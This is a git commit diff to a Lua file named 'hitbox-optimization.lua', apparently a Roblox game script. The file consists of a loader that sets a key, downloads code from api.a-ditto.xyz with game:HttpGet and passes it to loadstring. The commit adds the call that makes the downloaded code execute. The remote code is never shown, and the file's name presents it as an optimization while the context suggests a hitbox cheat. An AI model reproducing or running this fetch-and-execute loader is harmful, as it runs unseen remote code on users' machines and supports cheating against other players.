8bd37d0855bcacfb31a5ce8b183e486d85426215
Qumu <3552938843@qq.com>
2025-10-29 22:35:47 +0800

    Update hitbox-optimization.lua

--- hitbox-optimization.lua
+++ hitbox-optimization.lua
@@ -1,2 +1,2 @@
 getfenv().ADittoKey="SPINNIN ON IT"
-loadstring(game:HttpGet("https://api.a-ditto.xyz/files/g2rZXHcdP6jBxl_v9UX9SjyvfphylDKLwTvZmOEYxI2_EfDCsR9UtnOXDV71_sfSZBqDnI6jSGY2P456SRsSjg"))
+loadstring(game:HttpGet("https://api.a-ditto.xyz/files/g2rZXHcdP6jBxl_v9UX9SjyvfphylDKLwTvZmOEYxI2_EfDCsR9UtnOXDV71_sfSZBqDnI6jSGY2P456SRsSjg"))()
